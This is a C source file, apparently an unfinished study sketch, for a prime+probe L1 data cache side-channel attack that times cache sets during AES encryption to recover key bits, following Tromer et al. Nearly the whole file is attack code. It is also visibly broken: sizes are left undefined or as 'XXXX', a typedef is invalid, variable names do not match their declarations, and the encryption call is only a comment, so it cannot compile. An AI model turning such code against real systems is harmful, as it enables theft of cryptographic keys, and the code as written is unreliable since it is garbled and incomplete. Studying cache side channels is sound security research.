/*L1 data cache attacks with 2 method*/
/* L1 Data cache (prime + probe) the entire cache
                                (evict + time) some cache patterns */

/*Tromer_OS_10, extracting AES using 65ms measurements*/

/*assuming random plaintext, no collisions in accessing table indexes*/


/*synchronous known-data(plaintext and cypertest) attacks*/
/*online stage:  know plaintest and memory-access side0channel information 
  during the encryption of that plaintext.*/

/*prime + probe, using the pointer chasing*/ 
/*
 -memory initialized into a linked list, randomly permuted 
 -travsersing this list for pirme and probe 
 -using a doubled linked list, traversing forward for priming
backward for probing 
 -stores each obtained sample into the same cache set it has just finished measuring */


/*For the first round, each of the table access is independent 
 distinguished up to the size of a cache line*/

#include <stdlib.h>


/*FIXME: declare sizes that related with this attack*/
#define L1D_SIZE XXXX 
#define CL_SIZE 
#define N_SETS 
#define N_WAYS 
#define SET_SIZE  
#define AES_MSG_SIZE 
#define N_P_LINES   (256/16) /*0, 16, 32, 256*/
#define AES_MSG_SIZE 
#define MIN_DETECTABLE  16

typedef struct bl{
    uint64_t time; 
    struct bl *prev; 
    struct bl *next; 
    struct bl *next_set; 
} bl_s;                  /*a buffer line layout*/

char p_buf[L1D_SIZE]; 
char p_text[AES_MSG_SIZE]; 
typedef  t_u p_time[N_P_LINES][N_SETS] p_time_t;

p_time_t msg_time[AES_MSG_SIZE]; 


bl_s *set0_head = NULL; 
bl_s *set0_tail = NULL; 

void buffer_init(void) {

    bl_s *p_l, *l; 
    bl_s *set_h, *set_t, *p_set_h, *p_set_t; 
    uint32_t n_l, w; 

    memset(p_buffer, 0, L1D_SIZE); 

    for (int s = 0; s < N_SETS; s++) {

        p_l = set_h = set_t = NULL; 
        n_l = 0; 

        while (n_l < N_WAYS) {
            /*memory initalized into a double linked list, 
              randomly permuted*/
            w = rand() % N_WAYS; 
            l = (bl_s *)(p_buff + s * CL_SIZE + w * SET_SIZE); 
            
            if (l->prev || l->next) 
                continue; 

            l->prev = p_l; 
            if (p_l) 
                p_l->next = l; 

            if (!n_l)
                set_h = l; 
            
            n_l++; 
            if (n_l == N_WAYS) 
                set_t = l; 
    }
        if (!s) {

            set0_head = set_h; 
            set0_tail = set_t; 
        } else {
            
            p_set_h->next_set = set_t; 
            p_set_t->next_set = set_h; 
        }
    
        p_set_h = set_h; 
        p_set_t = set_t;
    }
}


void prime (void) {

    bl_s *s, *l; 

    s = set0_head; 
    while (s) {

        l = s; 
    
        /*traversing forward for priming*/
        while (l->next) 
            l = l->next; 

        s = l->next_set; 
    }

}


void probe (void) {

    bl_s *s, *l; 
    t_u start, end; 

    s = set0_tail; 

    while (s) {

        l = s; 
        start = rdtsc_cpuid(); 
        
        /*traversing backward for probing*/

        while (l->prev) 
            l = l->prev; 
        
        end = rdtsc_cpuid(); 
        l->time = end - start; 
        s = l->next_set; 
    }
}


void encry(void) {

    /*constracting a plain text and trigger an AES encryption*/

    for (int i = 0; i < AES_MSG_SIZE; i++) 
        p_test[i] = rand() % 256;

    /*aes_encryption*/
}

void record(void) {

    unsigned char p; 
    bl_s *s_n, *l;
    p_time_t *g; 

    for (int i = 0; i < AES_MSG_SIZE; i++) {

        g = msg_time + i; 
       
        /*FIXME: fix this part*/
        p = p_text[i] / MIN_DETECTABLE; /*16, the last few bits are unknown as cache line offset*/

        l = set0_tail; 

        for (int s = 0; s < N_SETS; s++) {

            while (l->prev) 
                l = l->prev;

            g[p][s] += l->time; 
            l = l->next_set;
        }
    }
}

void process(void) {

    p_time_t *g; 

    for (int i = 0; i < AES_MSG_SIZE; i++) {

        g = msg_time + i; 

        for (int p = 0; p < N_P_SETS; p++) {
            for (int s = 0; s < N_SETS; s++) {
            printf ("%d %s %llu\n", p, s, g[p][s]); 
            }
        }

    }
   
}

void dcache_attack(void) {

    buffer_init(); 

    for (int n = 0; n < N_TESTS; n++) {

        prime(); 
        encry(); 
        
        probe(); 
        record(); 
    }

    process(); 

}
